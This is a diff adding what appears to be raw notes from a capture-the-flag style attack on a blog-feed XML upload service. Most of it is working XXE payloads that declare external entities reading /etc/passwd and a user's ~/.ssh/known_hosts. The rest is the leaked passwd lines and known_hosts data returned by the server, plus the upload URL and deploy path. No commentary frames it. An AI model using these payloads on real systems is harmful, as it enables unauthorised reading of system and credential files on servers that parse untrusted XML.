@@ -1,0 +1,43 @@
+<?xml version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE GVI [<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
+<Channel>
+<Author>Bob</Author>
+<Subject>Some Subject</Subject>
+<Content>&xxe;</Content>
+</Channel>
+
+<?xml version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE GVI [<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
+<Channel>
+<Author>jack</Author>
+<Subject>js</Subject>
+<Content>&xxe;</Content>
+</Channel>
+
+roosa:x:1002:1002:,,,:/home/roosa:/bin/bash
+sshd:x:121:65534::/var/run/sshd:/usr/sbin/nologin
+blogfeed:x:1003:1003:,,,:/home/blogfeed:/bin/false
+
+<?xml version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE GVI [<!ENTITY xxe SYSTEM "file:///home/roosa/.ssh/known_hosts" >]>
+<Channel>
+<Author>jack</Author>
+<Subject>js</Subject>
+<Content>&xxe;</Content>
+</Channel>
+
+
+
+
+ PROCESSED BLOGPOST: 
+  Author: jack
+ Subject: js
+ Content: |1|UAZEMnlc1N5KOdK/ZxK6Ggng9FY=|hTYSll3B4tN2lr+D6RrzShp/IAE= ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOEYP1w+H8Uuvfh0fzjA15tqYhqxIhiT8ODPLI4qTBvrM8pZIGErdFlMYGV3rhJAYqGJD05LsvJxC8zozRFmZuw=
+|1|2VTQFW7bgrpiV5JeP1h8cXJ0cDU=|gJ6guSkeBWP3AtJU/l4I03RV71w= ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOEYP1w+H8Uuvfh0fzjA15tqYhqxIhiT8ODPLI4qTBvrM8pZIGErdFlMYGV3rhJAYqGJD05LsvJxC8zozRFmZuw=
+|1|mSCMFo5Aad5ZLEEqobttHEutn3k=|7CC0ZkrUfPioDaDDMS1PYmRy16M= ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOEYP1w+H8Uuvfh0fzjA15tqYhqxIhiT8ODPLI4qTBvrM8pZIGErdFlMYGV3rhJAYqGJD05LsvJxC8zozRFmZuw=
+
+ URL for later reference: /uploads/s.xml
+ File path: /home/roosa/deploy/src
+
+
+
